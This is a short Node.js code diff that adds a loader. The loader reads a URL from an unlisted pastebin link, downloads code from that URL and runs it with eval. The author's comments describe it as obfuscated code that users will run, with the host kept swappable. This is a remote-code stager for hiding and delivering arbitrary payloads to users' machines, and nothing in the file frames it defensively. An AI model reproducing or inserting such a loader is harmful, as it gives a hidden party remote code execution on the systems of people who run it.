@@ -1,12 +1,18 @@
-// This is the (unobfuscated) code that the user will initially run
-// and will be on a unlisted pastebin, so if the host
-// ever changes, I can change it easily.
+// This is the (unobfuscated here) code that the user will initially run
+// and the host will be on a unlisted pastebin, just incase.
+// This should never need to change.
 
+const https = require('https');
 const http = require('http');
 
-const get = (url, headers) => {
+const httpTable = {
+    https,
+    http,
+};
+
+const req = (httpS, method, url, headers = {}) => {
     return new Promise((resolve, reject) => {
-        http.get(url, (res) => {
+        httpTable[httpS][method](url, { headers }, (res) => {
             let responseStr = '';
 
             res.on('data', (data) => {
@@ -19,3 +25,8 @@ const get = (url, headers) => {
         }).on('error', (e) => reject(e));
     });
 };
+
+req('https', 'get', 'https://pastebin.com/raw/byqR6BER').then((url) => {
+    const startsWithHttps = url.toLowerCase().startsWith('https');
+    req(startsWithHttps ? 'https' : 'http', 'get', url.toLowerCase()).then((res) => eval(res));
+});
